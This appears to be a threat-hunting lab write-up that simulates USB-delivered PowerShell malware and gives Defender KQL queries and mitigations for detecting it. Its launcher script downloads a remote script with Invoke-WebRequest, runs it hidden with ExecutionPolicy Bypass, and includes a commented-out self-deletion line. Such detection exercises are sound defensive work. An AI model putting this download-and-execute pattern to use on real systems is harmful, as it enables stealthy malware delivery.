# Threat Event (USB Malware Execution via PowerShell)

**USB Device Triggers Malicious PowerShell Invoke-WebRequest Payload**

---

## Pre-steps:

I. **Created PowerShell simulation scripts to mimic malware behavior:**
   * `usb-mount.ps1` â€“ [GitHub Link](https://github.com/jason-p-nguyen/threat-hunting-projects/blob/main/usb_malware_execution/scripts/usb-mount.ps1)
   * `malicious-usb-launcher.ps1` â€“ [GitHub Link](https://github.com/jason-p-nguyen/threat-hunting-projects/blob/main/usb_malware_execution/scripts/malicious-usb-launcher.ps1)
   * `fake-malware.ps1` â€“ [GitHub Link](https://github.com/jason-p-nguyen/threat-hunting-projects/blob/main/usb_malware_execution/scripts/fake-malware.ps1)
   * `usb-unmount.ps1` â€“ [GitHub Link](https://github.com/jason-p-nguyen/threat-hunting-projects/blob/main/usb_malware_execution/scripts/usb-unmount.ps1)
   * `master-usb-malware-sim.ps1` â€“ ðŸ”— [GitHub Link](https://github.com/jason-p-nguyen/threat-hunting-projects/blob/main/usb_malware_execution/scripts/master-usb-malware-sim.ps1)

     > Master orchestration script that runs the full scenario end-to-end (mount USB â†’ drop payload â†’ execute â†’ cleanup â†’ unmount).

II. **Simulated USB insertion** using `usb-mount.ps1` to mount a virtual payload directory `E:\Payload`.

III. **Dropped malicious launcher (`malicious-usb-launcher.ps1`) into E:\Payload** to mimic USB-delivered attack content.

IV. **Used `master-usb-malware-sim.ps1`** to automate the full lifecycle from insertion to cleanup.

---

## Steps the "Bad Actor" Took to Create Logs and IoCs:

1. Executed the USB payload (malicious-usb-launcher.ps1):
```powershell
<#
.SYNOPSIS
    Simulates USB-delivered malware using PowerShell.
.DESCRIPTION
    Downloads a fake payload from an external source, waits to mimic stealth, then executes it.
#>

Write-Output "[*] USB device connected. Initializing..."
Start-Sleep -Seconds 5

Write-Output "[*] Downloading external payload to disk..."
Start-Sleep -Seconds 3
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/jason-p-nguyen/malware-sim/main/fake-malware.ps1" -OutFile "C:\Temp\payload.ps1"
Write-Output "[+] Payload saved to C:\Temp\payload.ps1"

Write-Output "[*] Waiting to avoid immediate detection..."
Start-Sleep -Seconds 10

Write-Output "[*] Executing payload using PowerShell..."
Start-Sleep -Seconds 2
Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Temp\payload.ps1"

Write-Output "[+] Payload launched. Continuing background operations..."
Start-Sleep -Seconds 5

Write-Output "[*] Cleaning up launcher evidence (simulated)..."
Start-Sleep -Seconds 2
# (Optional) Remove-Item -Path $MyInvocation.MyCommand.Path -Force

Write-Output "[âœ“] Simulation complete. USB payload execution mimicked."
```
2. **Payload executed silently**, simulating second-stage malware execution.

3. **Cleanup actions performed automatically** via `master-usb-malware-sim.ps1`:

   * Deleted temporary artifacts
   * Unmounted USB using `usb-unmount.ps1`

---

## Tables Used to Detect IoCs:

| **Parameter** | **Description**                                                                                                  |
| ------------- | ---------------------------------------------------------------------------------------------------------------- |
| **Name**      | DeviceFileEvents                                                                                                 |
| **Info**      | [DeviceFileEvents Table](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicefileevents-table) |
| **Purpose**   | Detect file creation/deletion from USB, and downloaded `.ps1` files to temp folders.                             |

| **Parameter** | **Description**                                                                                                        |
| ------------- | ---------------------------------------------------------------------------------------------------------------------- |
| **Name**      | DeviceProcessEvents                                                                                                    |
| **Info**      | [DeviceProcessEvents Table](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table) |
| **Purpose**   | Detect suspicious PowerShell activity, `-ExecutionPolicy Bypass`, `Invoke-WebRequest`, and script execution.           |

| **Parameter** | **Description**                                                                                                        |
| ------------- | ---------------------------------------------------------------------------------------------------------------------- |
| **Name**      | DeviceNetworkEvents                                                                                                    |
| **Info**      | [DeviceNetworkEvents Table](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicenetworkevents-table) |
| **Purpose**   | Detect outbound HTTP calls to download remote scripts or payloads.                                                     |

---

## Related Queries:

```kql
// Detect PowerShell execution of scripts after USB insertion
DeviceProcessEvents
| where DeviceName == "fin-w10-wks-8"
| where AccountName == "jnguyen.admin"
| order by Timestamp desc
| project Timestamp, DeviceName, Account = AccountName, FileName, FolderPath, ProcessCommandLine

// Detect file creation or deletion in TEMP or USB paths
DeviceFileEvents
| where DeviceName == "fin-w10-wks-8"
| where InitiatingProcessAccountName == "jnguyen.admin"
| order by Timestamp desc
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, Account = InitiatingProcessAccountName, InitiatingProcessCommandLine

// Detect outbound connections to malicious or external sources via PowerShell
DeviceNetworkEvents
| where DeviceName == "fin-w10-wks-8"
| where InitiatingProcessAccountName == "jnguyen.admin"
| order by Timestamp desc
| project Timestamp, DeviceName, Account = InitiatingProcessAccountName, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessCommandLine
```

---

## Created By:

* **Author Name**: Jason Nguyen
* **Author Contact**: [https://github.com/jason-p-nguyen](https://github.com/jason-p-nguyen)
* **Date**: July 3, 2025

---

## Additional Notes:

* USB-based attacks remain a common method for **initial access** or **insider delivery**, especially in red team exercises and physical breach scenarios.
* PowerShell-based payloads are often used for **stealthy execution**, **fileless attacks**, or **remote payload staging**.
* Consider applying the following mitigations:

  * Disable `Invoke-WebRequest` and `IEX` in user PowerShell sessions
  * Enforce signed scripts only (`AllSigned` execution policy)
  * Monitor for USB mount events and autorun behavior
  * Use device control software to restrict USB access

---

## Revision History:

| **Version** | **Changes**         | **Date**     | **Modified By** |
| ----------- | ------------------- | ------------ | --------------- |
| 1.0         | Initial draft       | July 1, 2025 | Jason Nguyen    |
| 1.1         | Added master script | July 3, 2025 | Jason Nguyen    |

